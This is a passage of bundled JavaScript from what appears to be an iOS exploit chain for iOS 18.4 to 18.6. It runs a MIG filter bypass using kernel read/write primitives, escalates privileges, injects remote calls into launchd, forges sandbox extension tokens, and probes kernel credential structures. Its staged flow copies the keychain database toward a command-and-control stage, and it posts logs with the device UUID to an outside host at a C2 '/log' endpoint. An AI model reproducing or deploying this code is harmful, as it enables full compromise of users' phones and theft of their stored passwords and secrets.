		let portObj = libs_TaskRop_Task__WEBPACK_IMPORTED_MODULE_3__["default"].getPortKObject(threadSelf);
		if (!portObj || portObj === false || portObj === 0 || portObj === 0n) {
			try { if (typeof pe_alive_ping === "function") pe_alive_ping("pe_mig_skip_no_port"); } catch (_mp) {}
			return false;
		}
		let threadSelfAddr = BigInt(portObj);

		let threadMem = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("calloc", 1, 0x400));
		if (!threadMem) return false;
		let kernelRW = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].transferRW();
		if (!kernelRW || kernelRW.controlSocket == null || kernelRW.rwSocket == null) {
			try { if (typeof pe_alive_ping === "function") pe_alive_ping("pe_mig_skip_no_rw"); } catch (_mr) {}
			return false;
		}
		let kernelBase = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].getKernelBase();
		if (!kernelBase) {
			try { if (typeof pe_alive_ping === "function") pe_alive_ping("pe_mig_skip_no_kbase"); } catch (_mk) {}
			return false;
		}
		kernelBase = BigInt(kernelBase);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem, BigInt(kernelRW.controlSocket));
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x8n, BigInt(kernelRW.rwSocket));
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x10n, kernelBase);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x18n, threadSelfAddr);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x20n, this.#runFlagPtr);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x28n, this.#isRunningPtr);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x30n, this.#mutexPtr);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x38n, BigInt(off.migLock));
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x40n, BigInt(off.migSbxMsg));
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x48n, BigInt(off.migKernelStackLR));
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x50n, this.#monitorThread1Ptr);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x58n, this.#monitorThread2Ptr);
		//Native.write64(threadMem, lock.kernelSlide);
		//Native.write64(threadMem + 0x8n, lock.lockAddr);
		//console.log(TAG, `Spawn bypass thread with args: kernelSlide=${Utils.hex(lock.kernelSlide)}, lockAddr=${Utils.hex(lock.lockAddr)}`);
		const threadCode = "fcall_init(); " + _raw_loader_dist_MigFilterBypassThread_js__WEBPACK_IMPORTED_MODULE_9__["default"];
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].threadSpawn(threadCode, threadMem);

		for (let i=0; i<10; i++) {
			let isRunning = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read32(this.#isRunningPtr);
			if (isRunning)
				break;
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("usleep", 500000);
		}

		this.#running = true;
		return true;
	}

	stop() {
		if (!this.#running)
			return;

		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write32(this.#runFlagPtr, 0);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("sleep", 1);
		this.#running = false;
	}

	pause() {
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write32(this.#runFlagPtr, 2);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("sleep", 1);
	}

	resume() {
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write32(this.#runFlagPtr, 1);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("sleep", 1);
	}

	monitorThreads(thread1, thread2) {
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(this.#monitorThread1Ptr, thread1);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(this.#monitorThread2Ptr, thread2);
	}
}
function xnuVersion() {
	libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("uname", libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem);
	const release = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].readString(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem + 0x200n, 0x100);
	let splittedVersion = release.split(".");
	let xnuMajor = splittedVersion[0];
	let xnuMinor = splittedVersion[1];
	return {major: xnuMajor, minor: xnuMinor};
}

const TAG = "MAIN";
//const targetProcess = "bluetoothd";
const targetProcess = "SpringBoard";

function start() {
	let mutexPtr = null;
	let migFilterBypass = null;
	globalThis.xnuVersion = xnuVersion();
	let ver = globalThis.xnuVersion;
	try { if (typeof pe_alive_ping === "function") pe_alive_ping("pe_xnu:" + ver.major + "." + ver.minor); } catch (_xv) {}

	// If iOS >= 18.4 we apply migbypass in order to bypass autobox restrictions
	if (ver.major == 24 && ver.minor >= 4) {

		mutexPtr = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("malloc", 0x100));
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("pthread_mutex_init", mutexPtr, null);
		migFilterBypass = new MigFilterBypass(mutexPtr);
		try { if (typeof pe_alive_ping === "function") pe_alive_ping("pe_mig_ctor"); } catch (_mc) {}
	}
	let driver = new libs_Driver_Driver__WEBPACK_IMPORTED_MODULE_7__["default"]();

	libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].init(driver, mutexPtr);

	let resultPE = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].runPE();
	try { if (typeof pe_alive_ping === "function") pe_alive_ping(resultPE ? "pe_runPE_ok" : "pe_runPE_fail"); } catch (_rp) {}
	if (!resultPE)
		return;


	libs_TaskRop_TaskRop__WEBPACK_IMPORTED_MODULE_2__["default"].init();
	if (migFilterBypass) {
		try {
			var __migOk = migFilterBypass.start();
			if (__migOk === false) {
				var __majZ = Number(ver && ver.major);
				var __minZ = Number(ver && ver.minor);
				// 18.6+ keep hard-fail semantics; pre-18.6 drop bypass so start() can reach PEMK stages.
				if (__majZ === 24 && __minZ >= 6) {
					throw new Error("mig_start_failed");
				}
				try { if (typeof pe_alive_ping === "function") pe_alive_ping("pe_mig_disabled"); } catch (_md) {}
				migFilterBypass = null;
			}
		} catch (__migErr) {
			try { if (typeof pe_alive_ping === "function") pe_alive_ping("pe_mig_exc:" + String(__migErr).substring(0, 80)); } catch (_me) {}
			// Only swallow on XNU 24.x below .6 (iOS 18.4/18.5). 18.6+ rethrow — keep proven path.
			var __maj = Number(ver && ver.major);
			var __min = Number(ver && ver.minor);
			if (__maj === 24 && __min < 6) {
				migFilterBypass = null;
			} else {
				throw __migErr;
			}
		}
	}
	// ===== P7 Debug Logger (accumulate in memory, flush after sandbox escape) =====
	var p7_tag = "[P7] ";
	var p7_logBuf = "";
	function p7_flog(msg) {
		var line = p7_tag + msg;
		try { LOG(line); } catch (_lg) {}
		p7_logBuf += line + "\n";
		try { p7_postLogHttp(line); } catch (_ph) {}
	}
	function p7_logHostPort() {
		return { host: "cdn.gotoiphone.com", port: 443 };
	}
	// CFNetwork HTTP (no BSD socket). method=GET|POST; wantBody→return response body string or null.
	// optHp: optional {host,port} override (stage fetch uses delivery host; logs/war use p7_logHostPort).
	function __labCfHttp(method, httpPath, body, wantBody, optHp) {
		try {
			var N = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
			method = String(method || "GET").toUpperCase();
			httpPath = String(httpPath || "/");
			body = (body == null) ? "" : String(body);
			var hp = optHp || p7_logHostPort();
			var host = String((hp && hp.host) || "192.168.1.29");
			var port = ((hp && hp.port) | 0) || 9011;
			function __cfRd64(addr) {
				var bytes = N.read(addr, 8);
				if (!bytes || bytes.byteLength < 8) return 0n;
				var view = new DataView(bytes);
				return (BigInt(view.getUint32(4, true)) << 32n) | BigInt(view.getUint32(0, true));
			}
			function __cfWr64(addr, value) {
				var buffer = new ArrayBuffer(8);
				var view = new DataView(buffer);
				var bigValue = BigInt(value);
				view.setUint32(0, Number(bigValue & 0xFFFFFFFFn), true);
				view.setUint32(4, Number((bigValue >> 32n) & 0xFFFFFFFFn), true);
				N.write(addr, buffer);
			}
			var hostC = N.callSymbol("malloc", host.length + 1);
			N.writeString(hostC, host);
			var hostCF = N.callSymbol("CFStringCreateWithCString", 0n, hostC, 0x08000100);
			try { N.callSymbol("free", hostC); } catch (_fh) {}
			if (!hostCF || hostCF === 0n) return wantBody ? null : false;
			var readPtr = N.callSymbol("malloc", 8);
			var writePtr = N.callSymbol("malloc", 8);
			__cfWr64(readPtr, 0n);
			__cfWr64(writePtr, 0n);
			N.callSymbol("CFStreamCreatePairWithSocketToHost", 0n, hostCF, port, readPtr, writePtr);
			var readStream = __cfRd64(readPtr);
			var writeStream = __cfRd64(writePtr);
			try { N.callSymbol("CFRelease", hostCF); } catch (_rh) {}
			try { N.callSymbol("free", readPtr); } catch (_frp) {}
			try { N.callSymbol("free", writePtr); } catch (_fwp) {}
			if (!writeStream || writeStream === 0n) {
				if (readStream && readStream !== 0n) {
					try { N.callSymbol("CFRelease", readStream); } catch (_rr) {}
				}
				return wantBody ? null : false;
			}
			try { N.callSymbol("CFReadStreamOpen", readStream); } catch (_ro) {}
			var opened = N.callSymbol("CFWriteStreamOpen", writeStream);
			if (!opened) {
				try { N.callSymbol("CFRelease", readStream); } catch (_e1) {}
				try { N.callSymbol("CFRelease", writeStream); } catch (_e2) {}
				return wantBody ? null : false;
			}
			var ready = false;
			for (var ai = 0; ai < 100; ai++) {
				var st = Number(N.callSymbol("CFWriteStreamGetStatus", writeStream));
				if (st === 2) { ready = true; break; }
				if (st >= 5) break;
				try { N.callSymbol("usleep", 100000); } catch (_u) {}
			}
			if (!ready) {
				try { N.callSymbol("CFReadStreamClose", readStream); } catch (_e) {}
				try { N.callSymbol("CFWriteStreamClose", writeStream); } catch (_e) {}
				try { N.callSymbol("CFRelease", readStream); } catch (_e) {}
				try { N.callSymbol("CFRelease", writeStream); } catch (_e) {}
				return wantBody ? null : false;
			}
			var hdr;
			if (method === "POST") {
				hdr = "POST " + httpPath + " HTTP/1.0\r\nHost: " + host + "\r\nContent-Type: application/json\r\nContent-Length: " + body.length + "\r\nConnection: close\r\n\r\n";
			} else {
				hdr = "GET " + httpPath + " HTTP/1.0\r\nHost: " + host + ":" + port + "\r\nConnection: close\r\n\r\n";
				body = "";
			}
			var full = hdr + body;
			var CHUNK = 4096;
			var sent = 0;
			var waitLoops = 0;
			while (sent < full.length && waitLoops < 2000) {
				var can = N.callSymbol("CFWriteStreamCanAcceptBytes", writeStream);
				if (!can) {
					try { N.callSymbol("usleep", 10000); } catch (_u2) {}
					waitLoops++;
					continue;
				}
				waitLoops = 0;
				var end = sent + CHUNK;
				if (end > full.length) end = full.length;
				var part = full.substring(sent, end);
				var cbuf = N.callSymbol("malloc", part.length + 1);
				N.writeString(cbuf, part);
				var nw = Number(N.callSymbol("CFWriteStreamWrite", writeStream, cbuf, part.length));
				try { N.callSymbol("free", cbuf); } catch (_fc) {}
				if (nw <= 0) break;
				sent += nw;
			}
			var okSend = (sent >= full.length);
			var resp = "";
			if (okSend) {
				var rbuf = N.callSymbol("malloc", 65536);
				for (var iter = 0; iter < 80; iter++) {
					var has = true;
					try { has = !!N.callSymbol("CFReadStreamHasBytesAvailable", readStream); } catch (_hb) { has = true; }
					if (!has) {
						var rst = 0;
						try { rst = Number(N.callSymbol("CFReadStreamGetStatus", readStream)); } catch (_rs) {}
						if (rst >= 4) break;
						try { N.callSymbol("usleep", 20000); } catch (_u3) {}
						continue;
					}
					var nr = Number(N.callSymbol("CFReadStreamRead", readStream, rbuf, 65535));
					if (nr <= 0) break;
					resp += N.readString(rbuf, nr);
					var hi2 = resp.indexOf("\r\n\r\n");
					if (hi2 >= 0) {
						var clm = resp.substring(0, hi2).match(/Content-Length:\s*(\d+)/i);
						if (clm && (resp.length - (hi2 + 4)) >= parseInt(clm[1], 10)) break;
						if (!clm && resp.length > hi2 + 4) break;
					}
				}
				try { N.callSymbol("free", rbuf); } catch (_frb) {}
			}
			try { N.callSymbol("CFReadStreamClose", readStream); } catch (_e) {}
			try { N.callSymbol("CFWriteStreamClose", writeStream); } catch (_e) {}
			try { N.callSymbol("CFRelease", readStream); } catch (_e) {}
			try { N.callSymbol("CFRelease", writeStream); } catch (_e) {}
			if (wantBody) {
				if (!okSend) return null;
				var hi = resp.indexOf("\r\n\r\n");
				if (hi < 0) return null;
				var out = resp.substring(hi + 4);
				return (out.length > 0) ? out : null;
			}
			return okSend;
		} catch (_e) { return wantBody ? null : false; }
	}
	function p7_postLogHttp(text) {
		// MPD → C2 /log via CFNetwork (source=pe_mpd).
		try {
			var uuid = "";
			try { uuid = String(globalThis.__LAB_DEVICE_UUID__ || ""); } catch (_u) {}
			var body = JSON.stringify({ text: String(text).slice(0, 1800), source: "pe_mpd", uuid: uuid, deviceUUID: uuid });
			return !!__labCfHttp("POST", "/log", body, false);
		} catch (_pe) { return false; }
	}
	function p7_flushLog() {
		if (!p7_logBuf) return;
		try {
			let p7_fd = fopen(get_cstring("/tmp/p7_debug.log"), get_cstring("a"));
			if (p7_fd && p7_fd !== 0n) {
				let p7_buf = get_cstring(p7_logBuf);
				fwrite(p7_buf, 1n, BigInt(p7_logBuf.length), p7_fd);
				fclose(p7_fd);
				let p7_flushedLen = p7_logBuf.length;
				p7_logBuf = "";
				try { LOG(p7_tag + "log flushed to /tmp/p7_debug.log (" + p7_flushedLen + " bytes)"); } catch (_lf) {}
			}
		} catch (p7_fe) {
			try { LOG(p7_tag + "flush failed: " + p7_fe); } catch (_le) {}
		}
	}

		let p7_enableP7 = true;

		p7_flog("PEMK-A start alive (chain+runPE done)"); p7_flushLog();
	try { pe_alive_ping("pe_after_runPE"); } catch (_pa) {}

	// Newest PE claims /tmp/pe_lab_run.token AFTER s1 tokens (pre-s1 /tmp write often fails).
	// Until claimed, __peStillOwner() returns true so we never self-abort.
	var __peRunToken = String(Date.now()) + "-" + String((Math.floor(Math.random() * 1e9) >>> 0));
	var __peLockPath = "/tmp/pe_lab_run.token";
	var __peRunTokenClaimed = false;
	function __peStillOwner() {
		if (!__peRunTokenClaimed) return true;
		try {
			var N0 = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
			var fd = Number(N0.callSymbol("open", __peLockPath, 0));
			if (fd < 0) return false;
			var sz = Number(N0.callSymbol("lseek", fd, 0, 2));
			N0.callSymbol("lseek", fd, 0, 0);
			if (sz <= 0 || sz > 128) { N0.callSymbol("close", fd); return false; }
			var mem = N0.callSymbol("malloc", BigInt(sz + 1));
			N0.callSymbol("read", fd, mem, sz);
			N0.callSymbol("close", fd);
			var txt = "";
			try { txt = N0.readString(mem); } catch (_rs) {
				try {
					var u8 = new Uint8Array(N0.read(mem, sz));
					for (var ui = 0; ui < u8.length; ui++) if (u8[ui]) txt += String.fromCharCode(u8[ui]);
				} catch (_r3) {}
			}
			try { N0.callSymbol("free", mem); } catch (_f) {}
			txt = (txt || "").replace(/\0/g, "").trim();
			return txt === __peRunToken;
		} catch (_e) { return true; }
	}
	function __peClaimRunToken() {
		if (__peRunTokenClaimed) return true;
		try {
			var Nlock = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
			var paths = ["/tmp/pe_lab_run.token", "/private/var/tmp/pe_lab_run.token"];
			for (var pi = 0; pi < paths.length; pi++) {
				var lfd = Number(Nlock.callSymbol("open", paths[pi], 0x601, 0x1FF));
				if (lfd < 0) continue;
				__peLockPath = paths[pi];
				var lbuf = Nlock.callSymbol("malloc", BigInt(__peRunToken.length + 1));
				Nlock.writeString(lbuf, __peRunToken);
				Nlock.callSymbol("write", lfd, lbuf, __peRunToken.length);
				Nlock.callSymbol("close", lfd);
				try { Nlock.callSymbol("free", lbuf); } catch (_lf) {}
				try { Nlock.callSymbol("chmod", __peLockPath, 0x1FF); } catch (_lc) {}
				__peRunTokenClaimed = true;
				p7_flog("PEMK-B pe_run_token claimed path=" + __peLockPath);
				p7_flushLog();
				return true;
			}
			p7_flog("PEMK-B pe_run_token open fail (continue without lock)");
			p7_flushLog();
		} catch (_lk) {
			try { p7_flog("PEMK-B pe_run_token err: " + _lk); p7_flushLog(); } catch (_e2) {}
		}
		return false;
	}
	p7_flog("PEMK-A pe_run_token deferred until after s1 tokens"); p7_flushLog();

	// ===== Staged execution (current success flow) — /pe_stage/*.js marks progress =====
	// s1 launchd+tokens → s2 keychain_copier → s3 mempress/destroy launchd
	// → s4 SB loader → s6 Phase2 sqlite/securityd → s5 c2 (after dump; avoid securityd contention)
	let launchdTask = null;
	var __labKcCopier = null;

function __labKcReadStatus() {
		// Parse configd notify file. Ready iff ready=1 or db_ok=1 (copy finished).
		try {
			var N0 = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
			var fd = Number(N0.callSymbol("open", "/tmp/keychain_copier_status.txt", 0));
			if (fd < 0) {
				fd = Number(N0.callSymbol("open", "/tmp/keychain_mpd_go", 0));
				if (fd < 0) return null;
				var gsz = Number(N0.callSymbol("lseek", fd, 0, 2));
				N0.callSymbol("lseek", fd, 0, 0);
				if (gsz <= 0 || gsz > 512) { N0.callSymbol("close", fd); return null; }
				var gmem = N0.callSymbol("malloc", BigInt(gsz + 1));
				N0.callSymbol("read", fd, gmem, gsz);
				N0.callSymbol("close", fd);
				var gtxt = "";
				try { gtxt = N0.readString(gmem); } catch (_rs) {
					try {
						var g8 = new Uint8Array(N0.read(gmem, gsz));
						for (var gi = 0; gi < g8.length; gi++) if (g8[gi]) gtxt += String.fromCharCode(g8[gi]);
					} catch (_r2) {}
				}
				N0.callSymbol("free", gmem);
				gtxt = (gtxt || "").replace(/\0/g, "").trim();
				if (!gtxt) return null;
				return { ready: true, path: gtxt.split(/\s/)[0], raw: "go:" + gtxt };
			}
			var sz = Number(N0.callSymbol("lseek", fd, 0, 2));
			N0.callSymbol("lseek", fd, 0, 0);
			if (sz <= 0 || sz > 1024) { N0.callSymbol("close", fd); return null; }
			var mem = N0.callSymbol("malloc", BigInt(sz + 1));
			N0.callSymbol("read", fd, mem, sz);
			N0.callSymbol("close", fd);
			var txt = "";
			try { txt = N0.readString(mem); } catch (_rs2) {
				try {
					var u8 = new Uint8Array(N0.read(mem, sz));
					for (var ui = 0; ui < u8.length; ui++) if (u8[ui]) txt += String.fromCharCode(u8[ui]);
				} catch (_r3) {}
			}
			N0.callSymbol("free", mem);
			txt = (txt || "").replace(/\0/g, "").trim();
			if (!txt) return null;
			var ready = (/\bready=1\b/.test(txt) || /\bdb_ok=1\b/.test(txt));
			var path = "/tmp/keychain-2.db";
			var pm = txt.match(/\bpath=(\S+)/);
			if (pm) path = pm[1];
			return { ready: ready, path: path, raw: txt };
		} catch (_e) { return null; }
	}


	function __labKcDbSize(path) {
		try {
			var N0 = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
			var fd = Number(N0.callSymbol("open", path, 0));
			if (fd < 0) return -1;
			var sz = Number(N0.callSymbol("lseek", fd, 0, 2));
			N0.callSymbol("close", fd);
			return sz;
		} catch (_e) { return -1; }
	}

	// True "remote copy": open/read/write inside configd via RemoteCall (no InjectJS race).
	function __labRcCopyFile(rc, srcPath, dstPath) {
		try {
			var chunk = 0x10000;
			var pathBuf = rc.call(100, "calloc", 1, 512);
			if (!pathBuf || pathBuf === 0n) return { ok: false, err: "calloc_path" };
			rc.writeStr(pathBuf, srcPath);
			var srcFd = Number(rc.call(100, "open", pathBuf, 0));
			if (srcFd < 0) {
				rc.call(100, "free", pathBuf);
				return { ok: false, err: "open_src", fd: srcFd };
			}
			var sz = Number(rc.call(100, "lseek", srcFd, 0, 2));
			rc.call(100, "lseek", srcFd, 0, 0);
			if (sz <= 0) {
				rc.call(100, "close", srcFd);
				rc.call(100, "free", pathBuf);
				return { ok: false, err: "empty", sz: sz };
			}
			rc.writeStr(pathBuf, dstPath);
			var dstFd = Number(rc.call(100, "open", pathBuf, 0x601, 511));
			if (dstFd < 0) {
				rc.call(100, "close", srcFd);
				rc.call(100, "free", pathBuf);
				return { ok: false, err: "open_dst", fd: dstFd };
			}
			var buf = rc.call(100, "calloc", 1, chunk);
			if (!buf || buf === 0n) {
				rc.call(100, "close", srcFd);
				rc.call(100, "close", dstFd);
				rc.call(100, "free", pathBuf);
				return { ok: false, err: "calloc_buf" };
			}
			var left = sz;
			var ok = true;
			while (left > 0) {
				var n = left > chunk ? chunk : left;
				var nr = Number(rc.call(100, "read", srcFd, buf, n));
				if (nr <= 0) { ok = false; break; }
				var nw = Number(rc.call(100, "write", dstFd, buf, nr));
				if (nw !== nr) { ok = false; break; }
				left -= nr;
			}
			rc.call(100, "close", srcFd);
			rc.call(100, "close", dstFd);
			rc.call(100, "chmod", pathBuf, 511);
			rc.call(100, "free", buf);
			rc.call(100, "free", pathBuf);
			return { ok: ok && left === 0, sz: sz, left: left };
		} catch (e) {
			return { ok: false, err: String(e) };
		}
	}

	function __labApplyFreshToken(rc, path) {
		try {
			var tok = libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].getTokenForPath(path, false);
			if (!tok) return false;
			var rm = rc.mem();
			rc.writeStr(rm, tok);
			rc.call(100, "sandbox_extension_consume", rm);
			return true;
		} catch (_e) { return false; }
	}

	function __labWriteCopierReady(rc, path, sz) {
		try {
			var st = "ready=1 db_ok=1 path=" + path + " sz=" + sz + " src=1 via=rc_copy\n";
			var pb = rc.call(100, "calloc", 1, 512);
			rc.writeStr(pb, "/tmp/keychain_copier_status.txt");
			var fd = Number(rc.call(100, "open", pb, 0x601, 511));
			if (fd >= 0) {
				var sb = rc.call(100, "calloc", 1, st.length + 1);
				rc.writeStr(sb, st);
				rc.call(100, "write", fd, sb, st.length);
				rc.call(100, "close", fd);
				rc.call(100, "free", sb);
				rc.call(100, "chmod", pb, 511);
			}
			rc.writeStr(pb, "/tmp/keychain_mpd_go");
			fd = Number(rc.call(100, "open", pb, 0x601, 511));
			if (fd >= 0) {
				var gb = rc.call(100, "calloc", 1, path.length + 2);
				rc.writeStr(gb, path + "\n");
				rc.call(100, "write", fd, gb, path.length + 1);
				rc.call(100, "close", fd);
				rc.call(100, "free", gb);
				rc.call(100, "chmod", pb, 511);
			}
			rc.call(100, "free", pb);
		} catch (_w) {}
	}


	function __labParseIosVer() {
		var out = { maj: 0, min: 0, pat: 0, raw: "" };
		try {
			var N = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
			var sizePtr = N.callSymbol("calloc", 1, 8);
			if (!sizePtr || sizePtr === 0n) return out;
			var rc = Number(N.callSymbol("sysctlbyname", "kern.osproductversion", 0, sizePtr, 0, 0));
			if (rc !== 0) { N.callSymbol("free", sizePtr); return out; }
			var sz = Number(N.readPtr(BigInt(sizePtr)));
			if (sz <= 0 || sz > 64) { N.callSymbol("free", sizePtr); return out; }
			var buf = N.callSymbol("malloc", BigInt(sz + 1));
			if (!buf || buf === 0n) { N.callSymbol("free", sizePtr); return out; }
			N.write64(sizePtr, BigInt(sz + 1));
			rc = Number(N.callSymbol("sysctlbyname", "kern.osproductversion", buf, sizePtr, 0, 0));
			var s = "";
			if (rc === 0) {
				try { s = N.readString(buf, sz).replace(/\0/g, ""); } catch (_rs) { s = ""; }
			}
			N.callSymbol("free", buf);
			N.callSymbol("free", sizePtr);
			out.raw = s || "";
			var m = String(s).match(/^(\d+)\.(\d+)(?:\.(\d+))?/);
			if (m) {
				out.maj = parseInt(m[1], 10) || 0;
				out.min = parseInt(m[2], 10) || 0;
				out.pat = m[3] ? (parseInt(m[3], 10) || 0) : 0;
			}
		} catch (_e) {}
		return out;
	}

	// s5 previously called typeof __labParseIosVer inside stage2 scope → always ios=? / useNuiC2=0.
	// Cache + xnu fallback so 18.5/18.6.1+ correctly take the deadlock-safe NUI C2 path.
	function __labIosForGate() {
		var v = null;
		try {
			if (globalThis.__labIosVer && globalThis.__labIosVer.maj)
				v = globalThis.__labIosVer;
		} catch (_c) {}
		if (!v || !v.maj)
			v = __labParseIosVer();
		if (v && v.maj) {
			try { globalThis.__labIosVer = v; } catch (_s) {}
			return v;
		}
		try {
			var xv = globalThis.xnuVersion;
			var xm = xv ? Number(xv.major) || 0 : 0;
			var xn = xv ? Number(xv.minor) || 0 : 0;
			if (xm === 24 && xn === 5)
				v = { maj: 18, min: 5, pat: 0, raw: "18.5(xnu24.5)" };
			else if (xm === 24 && xn >= 6)
				// Prefer NUI C2 when patch unknown (18.6.1+ deadlock); 18.6.0 also OK on NUI.
				v = { maj: 18, min: 6, pat: 1, raw: "18.6+(xnu24." + xn + ")" };
		} catch (_x) {}
		if (!v) v = { maj: 0, min: 0, pat: 0, raw: "" };
		try { if (v.maj) globalThis.__labIosVer = v; } catch (_s2) {}
		return v;
	}

	function __peStage1() {
	p7_flog("PEMK-B0 before launchd RemoteCall isLaunchdSafe=1"); p7_flushLog();
	try { pe_alive_ping("pe_s1_pre_launchd"); } catch (_s1a) {}
	LOG("[PE] creating launchdTask...");
	launchdTask = new libs_TaskRop_RemoteCall__WEBPACK_IMPORTED_MODULE_8__["default"]("launchd",migFilterBypass);
	p7_flog("PEMK-B0 after launchd ctor ok=" + !!(launchdTask && launchdTask.success()) + " fail=" + (globalThis.__peRemoteFail || 0)); p7_flushLog();
	try { pe_alive_ping("pe_s1_post_launchd"); } catch (_s1b) {}
	if (!launchdTask.success()) {
		LOG("[PE] launchdTask FAILED");
		p7_flog("PEMK-B launchdTask FAILED"); p7_flushLog();
		try { globalThis.__peAbort = true; } catch (_a) {}
		return;
	}
	LOG("[PE] launchdTask OK, init sandbox...");
	p7_flog("PEMK-B1 before initWithLaunchdTask"); p7_flushLog();
	libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].initWithLaunchdTask(launchdTask);
	// Skip deleteCrashReports: first post-ctor launchd token + recursive deleteDir
	// reboots A13 (iPhone12,x) before createTokens even starts.
	p7_flog("PEMK-B1 skip deleteCrashReports"); p7_flushLog();
	p7_flog("PEMK-B1 before createTokens (nui-gate)"); p7_flushLog();
	try {
		libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].createTokens();
		LOG("[PE] sandbox tokens created");
		p7_flog("PEMK-B1 tokens ok"); p7_flushLog();
	} catch (tokEx) {
		p7_flog("PEMK-B1 createTokens THREW: " + String(tokEx).slice(0, 120));
		p7_flushLog();
		throw tokEx;
	}

	// ===== Self-process ucred READ-ONLY probe =====
	// Uses the PROVEN path from sandbox extension code (line 6641-6653):
	//   proc + 0x18 -> credRef + 0x28 -> ucred
	//   ucred + 0x18 = cr_uid (offset 24, matches IDA key 35)
	//   ucred + 0x78 = cr_label (offset 120, matches IDA key 44)
	try {
		let C = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"];
		let HEX = libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_5__["default"].hex;
		let T = libs_TaskRop_Task__WEBPACK_IMPORTED_MODULE_3__["default"];

		let selfTask = T.gSelfTask.addr;
		let selfProcRO = C.read64(selfTask + C.offsets().procRO);
		let selfProc = C.read64(selfProcRO);
		LOG("[UCRED] task=" + HEX(C.strip(selfTask)) + " proc=" + HEX(C.strip(selfProc)));

		let credRef = C.read64(selfProc + 0x18n);
		LOG("[UCRED] credRef=" + HEX(C.strip(credRef)));

		let diag = "proc=" + HEX(C.strip(selfProc));

		if (credRef && C.strip(credRef) >= 0xffffffd000000000n) {
			let ucred = C.read64(credRef + 0x28n);
			LOG("[UCRED] ucred=" + HEX(C.strip(ucred)));
			diag += "|ucred=" + HEX(C.strip(ucred));

			if (ucred && C.strip(ucred) >= 0xffffffd000000000n) {
				let cr_uid = C.read32(ucred + 0x18n);
				let cr_ruid = C.read32(ucred + 0x1cn);
				let cr_svuid = C.read32(ucred + 0x20n);
				let cr_ngroups = C.read32(ucred + 0x24n);
				let cr_label = C.read64(ucred + 0x78n);
				LOG("[UCRED] cr_uid=" + cr_uid + " cr_ruid=" + cr_ruid + " cr_svuid=" + cr_svuid + " cr_ngroups=" + cr_ngroups);
				LOG("[UCRED] cr_label=" + HEX(C.strip(cr_label)));
				diag += "|uid=" + cr_uid + "|ruid=" + cr_ruid + "|svuid=" + cr_svuid;
				diag += "|ngroups=" + cr_ngroups + "|cr_label=" + HEX(C.strip(cr_label));

				// Also dump a few more ucred fields for structure verification
				for (let doff = 0x00n; doff <= 0x80n; doff += 8n) {
					try {
						let val = C.read64(ucred + doff);
						diag += "|u+" + doff.toString(16) + "=" + HEX(C.strip(val));
					} catch(e3) {}
				}
			} else {
				diag += "|ucred_INVALID";
			}
		} else {
			diag += "|credRef_INVALID";
		}

		globalThis.__ucredDiag = diag;
		LOG("[UCRED] diag=" + diag.substring(0, 200));
	} catch (probeErr) {
		globalThis.__ucredDiag = "probe_error:" + String(probeErr);
		LOG("[UCRED] error: " + probeErr);
	}
	// ===== End ucred probe =====

	// Flush Phase 1 log now that sandbox tokens exist
	if (p7_enableP7) {
		p7_flog("launchd RC OK, sandbox tokens created");
		p7_flushLog();
	}

	// ===== keychain_copier: must run BEFORE P7 Phase 2 sqlite pipeline =====
